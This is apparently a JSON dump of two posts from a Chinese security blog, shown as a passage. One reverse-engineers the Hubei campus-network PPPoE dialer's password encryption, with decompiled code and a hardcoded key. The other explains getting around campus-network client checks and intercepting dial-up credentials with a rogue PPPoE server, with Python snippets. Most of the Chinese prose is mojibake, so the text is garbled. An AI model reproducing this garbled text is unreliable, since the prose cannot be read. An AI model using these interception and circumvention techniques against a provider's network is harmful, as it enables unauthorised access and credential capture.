++temp2; } } pHbKeyGa = \u0026amp;hbKeyGa; pHbKeyGb = \u0026amp;hbKeyGb; (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))(pThis, \u0026#34;[HBKEY] sga: %s\u0026#34;, \u0026amp;hbKeyGa); (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))(pThis, \u0026#34;[HBKEY] sgb: %s\u0026#34;, pHbKeyGb); hbKey = 0; memset(\u0026amp;v90, 0, 0x80u); if ( pHbKeyGb[9] % 2 ) { index1 = 0; index2 = 0; index3 = 63; while ( index1 \u0026lt; 128 ) { *(\u0026amp;hbKey + index1++) = pHbKeyGa[index2++]; *(\u0026amp;hbKey + index1++) = pHbKeyGb[index3--]; } } else { index4 = 0; index5 = 63; index6 = 0; while ( index4 \u0026lt; 128 ) { *(\u0026amp;hbKey + index4++) = pHbKeyGa[index5--]; *(\u0026amp;hbKey + index4++) = pHbKeyGb[index6++]; } } (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))(pThis, \u0026#34;[HBKEY] key: %s\u0026#34;, \u0026amp;hbKey);// hbKey = \u0026amp;\u0026#34;115e9d6643Fd6c391a32E6298dA8D70025Ae9269473c1053AdDc9dAa47Ec6f4092658912C89d9aB83644D6D32c0e898b2e2bCaF8B1E1F06d025dF5E184040654\u0026#34; sub_40EC40((void *)a2, \u0026amp;hbKey); v41 |= 1u; v146 = -1; std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;a3); return a2; } ä¸Šé¢çš„å°±æ˜¯ AidcRes.generateKey çš„æ•´ä¸ªæµç¨‹ï¼Œè¿™ä¸ªå‘å¤šå¹¶ä¸”å¤æ‚ï¼Œç®€è¦è¯´ä¸€ä¸‹ï¼Œå…·ä½“çœ‹ä»£ç ï¼ˆb_Username_MonthDay ä»£æŒ‡ \u0026lsquo;b177111122220517\u0026rsquo;ï¼Œä¸å†èµ˜è¿°ï¼‰\nç®—å‡º b_Username_MonthDayï¼Œusername_b_MonthDayï¼Œusername_MonthDay_bï¼ŒmonthDay_Username_b å››ä¸ªä¸œè¥¿çš„ md5 æ ¹æ® d5_b_Username_MonthDay[1] çš„ asciiçš„å¥‡å¶æ€§ï¼Œé‡æ’å››ä¸ª md5 çš„é¡ºåºå¹¶å¤åˆ¶ç»™å››ä¸ªå˜é‡ï¼Œåˆ†åˆ«ä¸º md5_1ï¼Œmd5_2ï¼Œmd5_3ï¼Œmd5_4ï¼Œ æ­¤æ—¶ä¼šç”¨åˆ°ç¬¬äºŒæ­¥çš„å››ä¸ªå˜é‡ï¼Œæ ¹æ®ä»–ä»¬çš„ç‰¹å®šä½æ¥è®¡ç®—å¾—å‡º hbkey_ga ä¸ hbkey_gb çš„å€¼ æ ¹æ® md5_1_pLus3remainder4 = *(char *)(md5_1 + 3) % 4; è¿™æ­¥çš„å€¼å– md5_1 å’Œ md5_2 æ’åˆ—ç®—å‡º hbkey_ga æ ¹æ® md5_4_plus5remainer4 = *((char *)md5_4 + 5) % 4; è¿™æ­¥çš„å€¼å– md5_3 å’Œ md5_4 æ’åˆ—ç®—å‡º hbkey_gb æ ¹æ® hbkey_gb[7] çš„ asciiï¼Œå¦‚æœå¥‡æ•°å°±æŠŠ hbkey_ga ä¸­çš„å­—æ¯éƒ½å¤§å†™ï¼Œå¶æ•°å°±æŠŠ hbkey_gb ä¸­çš„å­—æ¯éƒ½å¤§å†™ æ ¹æ® hbkey_gb[9] çš„ ascii çš„å¥‡å¶æ€§å¯¹ hbkey_ga ä¸ hbkey_gb çš„å€¼ç”¨ç®€å•ç®—æ³•è¿›è¡Œé‡æ’ï¼Œå¾—åˆ°çœŸå®çš„ hbkey è¿™å°±æ˜¯ä¸Šé¢æ‰€æœ‰ä»£ç çš„å¤§è‡´æµç¨‹ï¼Œä»£ç ä¸­æˆ‘ä¹Ÿæœ‰å¤§é‡æ³¨é‡Šï¼Œå¤§å®¶å¯ä»¥çœ‹çœ‹ã€‚\næ€»ç»“ è¿™ä¸ªéš¾ç‚¹åœ¨åˆ†æç®—æ³•ä¸Šé¢ï¼Œåˆ†æç®—æ³•ä¸»è¦è¿˜æ˜¯è¦é åŠ¨æ€è°ƒè¯•ï¼Œè¿‡ç¨‹ä¸­é‡åˆ°äº†å¾ˆå¤šå¾ˆéš¾çš„åœ°æ–¹ï¼Œå‚æ•°å’Œå‡½æ•°çš„é‡å‘½åä¸»è¦è¿˜æ˜¯é åŠ¨æ€è°ƒè¯•ï¼Œ ç„¶åå»çŒœæµ‹å®ƒçš„ä½œç”¨è¿›è¡Œé‡å‘½åã€‚\nè¿™äº›æ–‡ä»¶æˆ‘éƒ½ä¿å­˜äº†åˆ†æè®°å½•ï¼Œå¤§å®¶å¯ä»¥è·Ÿç€çœ‹çœ‹ï¼Œæ€»ç»“å¦‚ä¸‹\nAidcComm.idb çœ‹å¯¼å‡ºè¡¨å¯ä»¥çœ‹å‡ºæ˜¯å¹²å˜›çš„ï¼Œç›´æ¥ç‚¹è¿›GetPWDå³å¯çœ‹åˆ°æˆ‘çš„åˆ†æ AidcRes.idb é‡Œé¢ä¹Ÿæœ‰æˆ‘çš„åˆ†æï¼Œå…·ä½“æŸ¥çœ‹æˆ‘æ”¹è¿‡çš„å‡½æ•°å generateKeyï¼Œç„¶å x ä¸€ä¸‹çœ‹è°ƒç”¨åœ°æ–¹ x32dbg_AidcRes.dd32 ä¸ºæˆ‘åœ¨ç”¨ x32dbg åˆ†æAidcRes.exeçš„æ—¶å€™çš„è®°å½•ï¼Œæœ‰ä¸€äº›æˆ‘æ”¹è¿‡çš„å‡½æ•°åä»¥åŠç®€è¦åˆ†æ ç®€å•çš„åˆ†ææµç¨‹ä¸º bp LoadLibraryï¼Œæ–­åˆ° AidcComm.dllï¼Œç„¶åå…·ä½“çœ‹eaxå’Œæ ˆçš„å˜åŒ–ï¼Œæ‰¾åˆ°åŠ å¯†å‡½æ•°ï¼Œå†ä¸€å±‚ä¸€å±‚åˆ†æã€‚\nå»ºè®® ida ä¸ x32dbg ç»“åˆåˆ†æï¼Œæœ€å¥½èµ·ä¸ª pppoe æœåŠ¡å™¨æ‹¦æˆªè´¦å·å¯†ç ååŠ©åˆ†æï¼Œè§æˆ‘ä¸Šä¸€ç¯‡æ–‡ç«  PPPoEä¸­é—´äººæ‹¦æˆªä»¥åŠæ ¡å›­ç½‘çªç ´æ¼«è°ˆä¸­çš„ä»£ç ã€‚\nè°ƒç”¨æµç¨‹ä¸º AidcRes.generateKey(åˆ†æå¤§å¤´) \u0026ndash;\u0026gt; AidcComm.GetRegularAccount \u0026ndash;\u0026gt; AidcComm.GetPWD \u0026ndash;\u0026gt; AidcComm.encryptPwdWithKey(åˆ†æå¤§å¤´ï¼Œæ³¨æ„é‡Œé¢æœ‰ä¸ªåœ°æ–¹ f5 æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªkeyä¸­çš„å­—æ¯å…¨å¤§å†™çš„é‚£éƒ¨åˆ†ï¼Œè¯·ç»“åˆæ±‡ç¼–åˆ†æ)\nAidcRes.generateKeyå¤§è‡´æµç¨‹ï¼Œè¿™ä¸ªå‘å¤šå¹¶ä¸”å¤æ‚ï¼Œç®€è¦è¯´ä¸€ä¸‹ï¼Œå…·ä½“çœ‹ä»£ç  ï¼ˆb_Username_MonthDay ä»£æŒ‡ \u0026lsquo;b177111122220517\u0026rsquo;ï¼Œä¸å†èµ˜è¿°ï¼‰\nç®—å‡º b_Username_MonthDayï¼Œusername_b_MonthDayï¼Œusername_MonthDay_bï¼ŒmonthDay_Username_b å››ä¸ªä¸œè¥¿çš„ md5 æ ¹æ® d5_b_Username_MonthDay[1] çš„ asciiçš„å¥‡å¶æ€§ï¼Œé‡æ’å››ä¸ª md5 çš„é¡ºåºå¹¶å¤åˆ¶ç»™å››ä¸ªå˜é‡ æ­¤æ—¶ä¼šç”¨åˆ°ç¬¬äºŒæ­¥çš„å››ä¸ªå˜é‡ï¼Œæ ¹æ®ä»–ä»¬çš„ç‰¹å®šä½æ¥è®¡ç®—å¾—å‡º hbkey_ga ä¸ hbkey_gb çš„å€¼ æ ¹æ® hbkey_gb[7] çš„ asciiï¼Œå¦‚æœå¥‡æ•°å°±æŠŠ hbkey_ga ä¸­çš„å­—æ¯éƒ½å¤§å†™ï¼Œå¶æ•°å°±æŠŠ hbkey_gb ä¸­çš„å­—æ¯éƒ½å¤§å†™ æ ¹æ® hbkey_gb[9] çš„ ascii çš„å¥‡å¶æ€§å¯¹ hbkey_ga ä¸ hbkey_gb çš„å€¼ç”¨ç®€å•ç®—æ³•è¿›è¡Œé‡æ’ï¼Œå¾—åˆ°çœŸå®çš„ hbkey AidcComm.encryptPwdWithKeyå¤§è‡´æµç¨‹\npassword ç”¨ key RC4 ä¸€ä¸‹å¾—åˆ° A æŠŠ A md5 ä¸€ä¸‹å¾—åˆ° Bï¼Œå¦‚æœç¬¬ 11 ä½ä¸ºå¥‡æ•°ï¼Œå– B çš„å‰ 16 ä½ï¼Œå¶æ•°å°±å 16 ä½ï¼Œå¾—åˆ° C C å†ç”¨ key RC4 ä¸€ä¸‹å¾—åˆ° D D å† md5 ä¸€ä¸‹ï¼Œå– [8:24]å¾—åˆ° E E[ä»Šå¤©å‡ å·æ—¥æœŸ % 16] æ›¿æ¢ä¸º \u0026lsquo;b\u0026rsquo; å¾—åˆ°æœ€åçš„å¯†ç  ä¸ºäº†é˜²æ­¢è¢«å•†ä¸šåˆ©ç”¨ï¼Œå°±ä¸å…¬å¼€é€†å‘å¾—å‡ºçš„åŠ å¯†è„šæœ¬äº†ï¼Œå–œæ¬¢æŠ˜è…¾æ ¡å›­ç½‘çš„å¯ä»¥è‡ªè¡Œæ ¹æ®æœ¬æ–‡æ‘¸ç´¢ã€‚\nåˆ†ææ–‡ä»¶æ‰“åŒ… é£Youngå®½å¸¦_å¸¦åˆ†æ.7z ","permalink":"https://www.hacktech.cn/post/re-hubei-feiyoung-pc-version.html","summary":"\u003ch1 id=\"æ¹–åŒ—æ ¡å›­ç½‘pcç«¯æ‹¨å·ç®—æ³•é€†å‘\"\u003eæ¹–åŒ—æ ¡å›­ç½‘PCç«¯æ‹¨å·ç®—æ³•é€†å‘\u003c/h1\u003e\n\u003ch2 id=\"å‰è¨€\"\u003eå‰è¨€\u003c/h2\u003e\n\u003cp\u003eä¸Šä¸€æ–‡ \u003ca href=\"https://www.anquanke.com/post/id/178484\"\u003ePPPoEä¸­é—´äººæ‹¦æˆªä»¥åŠæ ¡å›­ç½‘çªç ´æ¼«è°ˆ\u003c/a\u003eæˆ‘ä»¬è°ˆåˆ°ä½¿ç”¨ PPPoE æ‹¦æˆªæ¥è·å–çœŸå®çš„è´¦å·å¯†ç ã€‚\u003cbr\u003e\nåœ¨è¿™ä¸ªçš„åŸºç¡€ä¸Šï¼Œæˆ‘å¯¹æˆ‘ä»¬æ¹–åŒ—çš„å®¢æˆ·ç«¯è¿›è¡Œäº†é€†å‘ï¼Œå¾—åˆ°äº†æ‹¨å·åŠ å¯†ç®—æ³•ã€‚\u003c/p\u003e","title":"æ¹–åŒ—æ ¡å›­ç½‘PCç«¯æ‹¨å·ç®—æ³•é€†å‘"},{"content":" æœ¬æ–‡é¦–å‘äºPPPoEä¸­é—´äººæ‹¦æˆªä»¥åŠæ ¡å›­ç½‘çªç ´æ¼«è°ˆï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚\nPPPoEä¸­é—´äººæ‹¦æˆªä»¥åŠæ ¡å›­ç½‘çªç ´æ¼«è°ˆ æ ¡å›­ç”Ÿæ´»å¿«ç»“æŸäº†ï¼Œä¹‹å‰è¿˜æœ‰ç‚¹æœªå®Œæˆçš„æƒ³æ³•ï¼Œè¶ç€è¿™ä¸¤å¤©æœ‰å…´è¶£ææã€‚\næ­¤æ–‡é¢å‘å¤§ä¼—æ˜¯é‚£ç§åœ¨æ ¡å›­å†…è‹¦å—æ‹¨å·å®¢æˆ·ç«¯çš„æ¯’å®³ï¼Œä½†æ˜¯åˆæƒ³è‡ªå·±åŠ¨æ‰‹æŠ˜è…¾ä¸‹çš„ã€‚\nä¸€äº›æˆ‘çŸ¥é“çš„åŠæ³• ç›®å‰ä¸»è¦çš„æ–¹æ³•å¯ä»¥å¯ä»¥åˆ†ä¸ºç§»åŠ¨ç«¯å’Œç”µè„‘å®¢æˆ·ç«¯ã€‚\nç§»åŠ¨ç«¯ ç§»åŠ¨ç«¯åŸºæœ¬æ˜¯åŸºäº http çš„ portal è®¤è¯ï¼Œè¿™ä¸ªè§£å†³æ–¹æ³•æ¯”è¾ƒå¤šï¼Œä½†ä¾æ®å‰§æƒ…æƒ…å†µè€Œå®šã€‚\næ¯”å¦‚æ‹¨å·åå…‹éš† mac åˆ°è·¯ç”±å™¨ï¼Œè¿˜æœ‰åŸºäºè¿™ä¸ªæ–¹æ³•çš„è¡ç”Ÿæ–¹æ³•ï¼Œæ¯”å¦‚æ‹¨å·å‰äº¤æ¢æœºï¼Œç™»é™†åæ”¹è·¯ç”±å™¨å¹¶å¤åˆ¶ mac åˆ°è·¯ç”±å™¨ã€‚è¿˜æœ‰æ¯”å¦‚è™šæ‹Ÿè·¯ç”±è½¬å‘ã€‚\nè¿™äº›å…¶å®éƒ½æ˜¯åˆ©ç”¨çš„æ£€æµ‹çš„åŸç†ï¼ŒæŒ‰é“ç†è¯´ï¼Œportal å¹¶ä¸åƒ PPPoE é‚£æ ·ï¼ŒPPPoE ä¸­é—´æ˜¯ä¸å…è®¸æœ‰è·¯ç”±èŠ‚ç‚¹çš„ï¼Œå› ä¸ºåœ¨ PADI å¹¿æ’­åŒ…æ˜¯æœ¬åœ°å¹¿æ’­ï¼Œæœ¬åœ°å¹¿æ’­è·¯ç”±å™¨ä¸ä¼šè¿›è¡Œè½¬å‘ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½æ‰¾åˆ°ä¸€ä¸ªç›®çš„ PPPoE Serverã€‚\nè¿™é‡Œæ‰¯è¿œäº†ï¼Œå…³äº PPPoE ä¸‹é¢å†è¯´ã€‚\næˆ‘ä»¬æ¥ç€çœ‹çœ‹ portalï¼Œè¿™ä¸ªæ˜¯åŸºäº HTTP çš„ï¼Œå¤§ä½“ä¸Šçš„æµç¨‹æ˜¯\nè®¿é—®ä¸€ä¸ª http ç½‘ç«™ï¼Œæ¯”å¦‚ http://www.qq.comï¼Œå› ä¸ºç½‘å…³ä¼šæ‹¦æˆª http è¯·æ±‚ç„¶åé‡å®šå‘åˆ°ä¸€ä¸ªå½¢å¦‚ http://58.53.199.144:8001/?userip=100.64.224.167\u0026amp;wlanacname=\u0026amp;nasip=58.50.189.124\u0026amp;usermac=1c-87-2c-77-77-9c çš„ç½‘å€ã€‚ æ­¤æ—¶ app ä¼šè§£æä¿¡æ¯ï¼Œæ¯”å¦‚ ipï¼Œmacã€‚æ£€æµ‹çš„åœ°æ–¹å°±æ˜¯åœ¨è¿™é‡Œï¼Œæ¯”å¦‚æ£€æµ‹ä½ çš„æ‰‹æœº ip æ˜¯å¦å’Œ userip ç›¸åŒï¼ŒåŠ å…¥ä½ åœ¨è·¯ç”±å™¨ä¸‹ï¼Œä½ çš„ ip åº”è¯¥æ˜¯å½¢å¦‚ 192.168.x.x çš„åœ°å€ï¼Œä½ çš„è·¯ç”±å™¨çš„ wan ip æ‰æ˜¯ å’Œ userip ç›¸åŒï¼Œè¿˜å¯èƒ½ä¼šè¿›è¡Œæ¯”å¦‚ mac åˆ¤æ–­ï¼Œè¿˜å¯èƒ½æ£€æŸ¥ arp è¡¨ï¼Œè‡³äºè¿™ä¸¤æ ·æ˜¯æ€æ ·æ£€æµ‹çš„æˆ‘æŒ‰ä¸‹ä¸è¡¨ï¼Œæ€»è€Œè¨€ä¹‹ï¼Œè¿™é‡Œé€šä¸è¿‡æ£€æµ‹ï¼Œapp å°±åˆ¤å®šä½ çš„ç½‘ç»œç¯å¢ƒä¸å¯¹ã€‚ ç„¶å app ä¼šå°†è´¦å·æˆ–å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œç„¶å post åˆ°è®¤è¯æœåŠ¡å™¨ï¼Œè®¤è¯é€šè¿‡åï¼Œä½ è¿™ä¸ª ip å°±å¯ä»¥ä¸Šç½‘äº†ã€‚ å…ˆè¯´è¯´ä¸ºä»€ä¹ˆå…‹éš† mac æœ‰ç”¨ï¼Œå› ä¸ºè®¤è¯æœåŠ¡å™¨é‚£è¾¹æ˜¯æ ¹æ® mac åˆ¤å®šçš„ï¼Œç›¸åŒçš„ mac åœ¨çŸ­æ—¶é—´å†…ä¼šè·å–åˆ°åŒæ ·çš„ ipï¼Œå¹¶ä¸”çŸ­æš‚æ—¶é—´çš„æ–­ç½‘ä¹Ÿæ˜¯å…è®¸çš„ã€‚å…¶ä»–è¡ç”Ÿæ–¹æ³•åŸç†ç±»ä¼¼ã€‚\nå†æ¥è¯´è¯´è¿˜æœ‰å“ªäº›åŠæ³•ï¼Œè¿™äº›åŠæ³•å¯èƒ½å¹¶æ²¡æœ‰ä¹‹å‰çš„å¥½æ“ä½œã€‚\næ¯”å¦‚ hook åˆ¤å®šå‡½æ•°\nè¿˜æœ‰æ¯”å¦‚æ”¹ Responseï¼ˆè¿™ä¸ªåŠæ³•æ˜¯å‰é˜µå­çš„æ€è·¯ï¼Œè¿˜æ²¡å®è·µæ˜¯å¦å¯è¡Œï¼Œæ—¢ç„¶åˆ¤æ–­å‚æ•°å–è‡ªå“åº”åŒ…ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”è¯¥èƒ½æƒ³åˆ°è¿™ä¸ªï¼‰\næˆ‘å‰é˜µå­ç”¨çš„æ¯”è¾ƒå¤šçš„å…¶å®æ˜¯ç›´æ¥é€†å‘ app è·å–åŠ å¯†æµç¨‹ç„¶åè‡ªå†™åè®®ï¼Œä½†æ˜¯ç°åœ¨çœ‹æ¥å¯èƒ½æ˜¯æœ€è´¹æ—¶è´¹åŠ›çš„ä¸€ç§äº†ï¼Œä¸è¿‡æœ‰ä¸€ç§å¥½å¤„ï¼Œä¸€ä¸ªäº§å“å¤§æ¦‚ç‡æ˜¯ä¸ä¼šæ¢åŠ å¯†ç®—æ³•çš„ï¼Œé¡¶å¤šå¯èƒ½æ”¹æ”¹å¯†é’¥ï¼Œæˆªå–åŠ å¯†åçš„æŸä¸€æ®µã€‚\nè¿™äº›å¤§è‡´ä¸Šå°±æ˜¯æˆ‘æ‰€çŸ¥é“çš„å‡ ç§ç§»åŠ¨ç«¯ä¸Šé¢çš„æ–¹æ³•äº†ã€‚\nç”µè„‘ç«¯ ç”µè„‘ç«¯æ–¹é¢è€é™ˆçš„æ–‡ç« å·²ç»å†™çš„å¾ˆå…¨é¢äº†ï¼Œè§ How To : ä»Netkeeper 4.Xå®¢æˆ·ç«¯è·å–çœŸå®è´¦å·\nè¿™é‡Œé¢æåˆ°äº†æˆ‘ä»¬å¯ä»¥ä¸‹æ‰‹çš„ä¸‰ä¸ªæ–¹é¢\nå®¢æˆ·ç«¯æœ¬èº« æ¯”å¦‚ hook RasDialW api å’Œ CE æš´æœã€‚\nä½†æ˜¯å°±å¦‚æ–‡ç« ä¸­æ‰€è¯´ï¼ŒåŠ äº†ä¿æŠ¤ï¼Œå¯èƒ½æ˜¯è‡ªè¡Œå®ç° peloader ä¹Ÿè¯´ä¸å®šï¼Œåæ­£å°±æ˜¯ç›¸å½“äºæ²¡èµ°ç³»ç»Ÿçš„ apiï¼Œè€Œæ˜¯è‡ªè¡Œæäº†ä¸€ä»½æ¥è¿›è¡Œæ‹¨å·ï¼Œè¿™æ ·å°±æ²¡åŠæ³•é€šè¿‡ hook ç³»ç»Ÿ api æ¥è·å–äº†ã€‚å¦å¤–æš´æœå†…å­˜ä¹Ÿæœ‰å±€é™ã€‚\næ‹¿æˆ‘ä»¬æ¹–åŒ—çš„ä¸¾ä¾‹å­ï¼Œæ¹–åŒ—çš„å®¢æˆ·ç«¯æ˜¯åŠ¨æ€åŠ è½½ä¸€ä¸ª dll æ¥è¿›è¡Œè´¦å·å¯†ç åŠ å¯†ï¼Œä½†æ˜¯è¿™ä¸ªè¿‡ç¨‹å¾ˆå¿«ï¼Œè¿™ä¸ªå®¢æˆ·ç«¯ä¸»è¦çš„æ“ä½œéƒ½è²Œä¼¼æ˜¯åœ¨ dll ä¸­å®Œæˆï¼Œè¿™é‡Œæˆ‘è¯´çš„å¿«æ˜¯æŒ‡ï¼Œä»–åŠ è½½ dll å®ŒæˆåŠ å¯†ç„¶åå¯èƒ½ åˆè°ƒç”¨äº†å®ƒçš„å…¶ä»– dll æ‹¨å·åï¼Œåªè¦ä¸€ä¸ªdllå®Œæˆäº†å®ƒçš„â€œä½¿å‘½â€ï¼Œå®ƒä¼šç«‹åˆ»å¸è½½ï¼Œå¯¼è‡´æˆ‘ä»¬é€šè¿‡ CE æ‰‹åŠ¨æš´æœå†…å­˜å‡ ä¹ä¸å¯èƒ½ï¼ˆè¿™é‡Œå¯èƒ½æˆ‘å†™çš„æœ‰è°¬è¯¯ï¼Œä¸è¿‡å°±æˆ‘åˆ†ææ¹–åŒ—çš„å®¢æˆ·ç«¯æ¥è¯´æ„Ÿè§‰æ˜¯è¿™æ ·ï¼‰\nç³»ç»Ÿå±‚é¢ è¿™ä¸ªå°±å¦‚æ–‡ç« ä¸­æåˆ°çš„äº‹ä»¶æ—¥å¿—ç›¸å…³çš„ä¸œè¥¿\nä¸­é—´äºº æ ¹æ® PPPoE åè®®çš„æµç¨‹ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥è‡ªå·±æä¸€ä¸ª server æ¥è¿›è¡Œæ‹¦æˆªã€‚\nä¸‹é¢æˆ‘ä»¬å°†è¯¦ç»†äº†è§£è¿™ä¸ªï¼Œä»¥åŠèƒ½å¤Ÿè‡ªå·±åŠ¨æ‰‹å®ç°ä¸€ä¸ªç®€å•çš„ PPPoE Serverã€‚\nPPPoE åè®®æµç¨‹ PPPoE æ˜¯ä¸€ä¸ªäºŒå±‚åè®®ï¼Œå·¥ä½œåœ¨é“¾è·¯å±‚ã€‚\nPPPoE ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œä¸€ä¸ªæ˜¯å‘ç°é˜¶æ®µï¼Œæˆ‘çš„ç†è§£å°±æ˜¯ä¸¤å°æœºå™¨å»ºç«‹èµ·ç‚¹å¯¹ç‚¹çš„è”ç³»ï¼Œç¬¬äºŒä¸ªæ˜¯ä¼šè¯é˜¶æ®µï¼Œè¿™ä¸ªé˜¶æ®µä¸»è¦æ˜¯é…ç½®ç¡®è®¤ï¼Œç„¶åå¼€å§‹éªŒè¯è´¦å·å¯†ç ã€‚\nè‡³äºåé¢çš„åˆ†é… ip çš„ç¡®å®šæˆ‘ä»¬æŒ‰ä¸‹ä¸è¡¨ï¼Œå› ä¸ºæ­¤æ–‡ä¸»è¦å…³æ³¨çš„æ˜¯æ‹¦æˆªã€‚\nPPPoE å…·ä½“å¯åˆ†ä¸ºä»¥ä¸‹é˜¶æ®µ\nPPPoEå‘ç°é˜¶æ®µ(Discovery) ä¸»æœºå¹¿æ’­å‘èµ·åˆ†ç»„ï¼ˆPADIï¼‰ æœ‰æ•ˆå‘ç°æä¾›åŒ…åˆ†ç»„ï¼ˆPADOï¼‰ æœ‰æ•ˆå‘ç°è¯·æ±‚åˆ†ç»„ï¼ˆPADRï¼‰ æœ‰æ•ˆå‘ç°ä¼šè¯ç¡®è®¤ï¼ˆPADSï¼‰ PPPoEä¼šè¯é˜¶æ®µ(Session) LCPåè®®è¯·æ±‚ç¡®è®¤é…ç½®(LCP-Config-Req) LCPåè®®ç¡®è®¤é…ç½®(LCP-Config-Ack) PAPæˆ–CHAPéªŒè¯è´¦å·å¯†ç  éªŒè¯é€šè¿‡åå¼€å§‹è¿›è¡Œä¸€äº›åç»­çš„åˆ†é… ip ä»¥åŠå…¶ä»–æ“ä½œã€‚\nPPPoE å‘ç°é˜¶æ®µ PADI PADI æ˜¯ä¸€ä¸ªå¹¿æ’­åŒ…ï¼Œå‘å¾€ ff:ff:ff:ff:ff:ff çš„å¹¿æ’­åœ°å€ï¼Œç„¶åè¿™ä¸ªå¹¿æ’­åŒ…ä¼šåœ¨æœ¬åœ°ç½‘ç»œè¿›è¡Œå¹¿æ’­ã€‚\nå®ƒçš„ CODE å­—æ®µå€¼ä¸º 0Ã—09ï¼ŒSESSION-IDï¼ˆä¼šè¯IDï¼‰å­—æ®µå€¼ä¸º 0Ã—0000ã€‚\nPADI åˆ†ç»„å¿…é¡»è‡³å°‘åŒ…å«ä¸€ä¸ª Host-Uniqï¼ŒHost-Uniqä¸ºä¸»æœºå”¯ä¸€æ ‡è¯†ï¼Œç±»ä¼¼äºPPPæ•°æ®æŠ¥æ–‡ä¸­çš„æ ‡è¯†åŸŸï¼Œä¸»è¦æ˜¯ç”¨æ¥åŒ¹é…å‘é€å’Œæ¥æ”¶ç«¯çš„ã€‚å› ä¸ºå¯¹äºå¹¿æ’­å¼çš„ç½‘ç»œä¸­å¯èƒ½ä¼šåŒæ—¶å­˜åœ¨å¾ˆå¤šä¸ªPPPoEçš„æ•°æ®æŠ¥æ–‡ã€‚\nå› ä¸ºæ­¤æ—¶å‘çš„æ˜¯å¹¿æ’­åŒ…ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æœ¬æœºæ­å»ºä¸€ä¸ª Server å¯¹ PADI è¿›è¡Œå“åº”ï¼Œå°±å¯ä»¥å¼€å§‹æˆ‘ä»¬çš„ä¸­é—´äººä½œä¸šäº†ã€‚\nå…·ä½“æµç¨‹å°±æ˜¯ç›‘å¬ç½‘å¡ï¼Œç„¶åè¿‡æ»¤ CODE å­—æ®µå€¼ä¸º 0Ã—09 çš„åŒ…ç„¶åè¿›è¡Œå“åº”å³å¯ã€‚\nå› ä¸ºå…¶ä¸­çš„ Host-Uniq å­—æ®µåœ¨åç»­çš„è¯·æ±‚ä¸­éƒ½éœ€è¦ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªå‡½æ•°æŠŠè¿™ä¸ªå­—æ®µå€¼æªå‡ºæ¥ã€‚\n1 2 3 4 5 6 7 8 9 10 #å¯»æ‰¾å®¢æˆ·ç«¯å‘é€çš„Host-Uniq def padi_find_hostuniq(self, payload): _key = b\u0026#39;\\x01\\x03\u0026#39; payload = bytes(payload) if _key in payload: _nIdx = payload.index(_key) _nLen = struct.unpack(\u0026#34;!H\u0026#34;, payload[_nIdx + 2:_nIdx + 4])[0] _nData = payload[_nIdx + 2:_nIdx + 4 + _nLen] return _key + _nData return éœ€è¦ä¼ å…¥çš„æ˜¯ä¸€ä¸ª Packet.payloadï¼Œpayload æ˜¯é™¤å»é“¾è·¯å±‚çš„å…¶ä»–æ•°æ®ï¼Œåœ¨è¿™é‡Œé¢å…·ä½“å°±æ˜¯ PPPoED ä¸‹é¢çš„æ•°æ®\nPADO å½“ä¸€ä¸ªæ¥å…¥é›†ä¸­å™¨ï¼ˆServerï¼‰æ¥æ”¶åˆ°ä¸€ä¸ª PADI åŒ…ä»¥åï¼Œå°±éœ€è¦è¿›è¡Œå“åº”ï¼Œå‘å‡º PADO åŒ…äº†ã€‚\nPADO åŒ…çš„ CODE å­—æ®µå€¼ä¸º 0Ã—07ï¼ŒSESSION-ID å­—æ®µå€¼ä»ä¸º 0Ã—0000ã€‚\nPADOåˆ†ç»„å¿…é¡»åŒ…å«ä¸€ä¸ªæ¥å…¥é›†ä¸­å™¨åç§°ç±»å‹çš„æ ‡ç­¾ï¼ˆæ­¤å¤„çš„æ ‡ç­¾ç±»å‹å­—æ®µå€¼ä¸º akkumanï¼‰ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªåå­—ï¼Œä½ æƒ³å¡«ä»€ä¹ˆéƒ½å¯ä»¥ã€‚\nå¹¶ä¸”éœ€è¦åŒ…å«å‰é¢ PADI åŒ…ä¸­çš„ Host-Uniq å­—æ®µï¼Œè¿™ä¸ªå­—æ®µåœ¨ PPPoE çš„å‘ç°é˜¶æ®µéƒ½æ˜¯å¿…è¦çš„ã€‚\nåœ¨è½½è·ä¸­å¯èƒ½æœ‰å¤šä¸ª tagï¼Œä»–ä»¬çš„æ ¼å¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | TAG_TYPE | TAG_LENGTH | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | TAG_VALUE ... ~ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ å¯ä»¥çœ‹å‡ºï¼Œæ ‡è®°çš„å°è£…æ ¼å¼é‡‡ç”¨çš„æ˜¯å¤§å®¶æ‰€ç†ŸçŸ¥çš„TLVç»“æ„ï¼Œä¹Ÿå³æ˜¯ï¼ˆç±»å‹+é•¿åº¦+æ•°æ®ï¼‰ã€‚æ ‡è®°çš„ç±»å‹åŸŸä¸º2ä¸ªå­—èŠ‚ï¼Œå„ä¸ªæ ‡è®°çš„ç±»å‹æ‰€ä»£è¡¨çš„å«ä¹‰å…·ä½“å¯ä»¥æŸ¥çœ‹ RFC 2516 